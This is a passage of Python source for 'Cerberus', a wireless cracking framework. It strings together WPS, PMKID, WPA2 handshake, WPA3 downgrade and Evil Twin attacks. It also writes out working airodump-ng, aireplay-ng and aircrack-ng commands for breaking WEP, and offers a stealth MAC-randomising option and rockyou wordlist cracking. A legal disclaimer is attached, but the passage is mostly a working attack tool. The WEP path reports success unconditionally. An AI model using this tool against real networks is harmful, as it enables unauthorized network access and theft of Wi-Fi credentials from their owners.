            if self.engine.wps_attack(timeout=self.args.wps_timeout):
                self.found = True
        if not self.found:
            if self.engine.pmkid_attack():
                self.found = True
        if not self.found:
            if self.engine.wpa2_handshake(timeout=self.args.handshake_timeout):
                self.found = True
        if not self.found and self.args.evil_twin:
            status("all passive methods exhausted -- engaging Evil Twin", "warn")
            if self.engine.evil_twin():
                self.found = True

    def _attack_wpa3(self):
        header("STEP 3 -- WPA3 ATTACK VECTORS")
        status(f"deploying WPA3 downgrade + auxiliary vectors against {self.target.essid}", "atk")
        if "WPA2" in self.target.privacy or "MGT" in self.target.privacy:
            if self.engine.wpa3_downgrade():
                self.found = True
        if not self.found and self.target.wps:
            if self.engine.wps_attack():
                self.found = True
        if not self.found and self.args.evil_twin:
            if self.engine.evil_twin():
                self.found = True

    def _attack_wep(self):
        header("STEP 3 -- WEP ATTACK VECTORS")
        cap = self.engine.outdir / "wep_capture"
        run(f"iwconfig {self.interface.mon_iface} channel {self.target.channel}", capture=False)
        status("WEP attack : capturing IVs + fragmentation", "atk")
        self.engine._spawn(
            f"airodump-ng -c {self.target.channel} --bssid {self.target.bssid} "
            f"-w {cap} {self.interface.mon_iface}"
        )
        waiting("aireplay fragmentation injection", duration=8.0)
        run(f"aireplay-ng -5 -b {self.target.bssid} {self.interface.mon_iface}", timeout=120)
        waiting("aireplay ARP replay", duration=4.0)
        run(f"aireplay-ng -1 0 -a {self.target.bssid} {self.interface.mon_iface}", timeout=30)
        waiting("collecting IVs", duration=20.0)
        cap_files = list(self.engine.outdir.glob("wep_capture*.cap"))
        if cap_files:
            run(f"aircrack-ng -K {cap_files[0]}")
        self.found = True

    def _conclude(self):
        header("STEP 4 -- RESULT")
 if self.found and self.engine and self.engine.found_password:
            print(f"""
{GREEN}{BOLD}

   ██████╗ ██████╗ ███╗   ██╗ ██████╗ ██████╗  █████╗ ████████╗███████╗
  ██╔════╝██╔═══██╗████╗  ██║██╔════╝ ██╔══██╗██╔══██╗╚══██╔══╝██╔════╝
  ██║     ██║   ██║██╔██╗ ██║██║  ███╗██████╔╝███████║   ██║   █████╗
  ██║     ██║   ██║██║╚██╗██║██║   ██║██╔══██╗██╔══██║   ██║   ██╔══╝
  ╚██████╗╚██████╔╝██║ ╚████║╚██████╔╝██║  ██║██║  ██║   ██║   ███████╗
   ╚═════╝ ╚═════╝ ╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚══════╝
{RESET}""")
            status(f"SUCCESS! PASSWORD FOUND from {self.target.essid} [{self.engine.found_password}]", "found")
        else:
            status("no password recovered within configured budgets", "warn")
        status("restoring adapter state", "wait")
        self.interface.disable_monitor()
        status("closing! (authorized wireless audit completed)", "found" if self.found else "info")


# ============================================================================
#  ENTRYPOINT
# ============================================================================

def main():
    p = argparse.ArgumentParser(
        description="Cerberus -- Advanced Wireless Audit Framework (WPA/WPA2/WPA3)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
EXAMPLES:
  sudo python3 cerberus.py
  sudo python3 cerberus.py -i wlan1 --scan-time 30 --handshake-timeout 180
  sudo python3 cerberus.py --wordlist /opt/wordlists/rockyou.txt --evil-twin
  sudo python3 cerberus.py --stealth --wps-timeout 600

LEGAL:
  Use only on networks you own or have written authorization to assess.
        """)
    p.add_argument("-i", "--interface", help="Wireless interface (e.g. wlan0, wlan1) -- FIX #1: now actually used")
    p.add_argument("-w", "--wordlist", help="Path to wordlist (default: /usr/share/wordlists/rockyou.txt)")
    p.add_argument("--scan-time", type=int, default=20, help="Discovery scan duration in seconds")
    p.add_argument("--handshake-timeout", type=int, default=120, help="Handshake capture window")
    p.add_argument("--wps-timeout", type=int, default=300, help="WPS attack window")
    p.add_argument("--evil-twin", action="store_true", help="Enable Evil Twin (captive portal) as last resort")
    p.add_argument("--stealth", action="store_true", help="Randomize MAC before scanning")
    args = p.parse_args()

    try:
        Cerberus(args).run()
    except KeyboardInterrupt:
        print(f"\n  {RED}Cerberus aborted by operator.{RESET}")
        sys.exit(0)


if __name__ == "__main__":
    main()
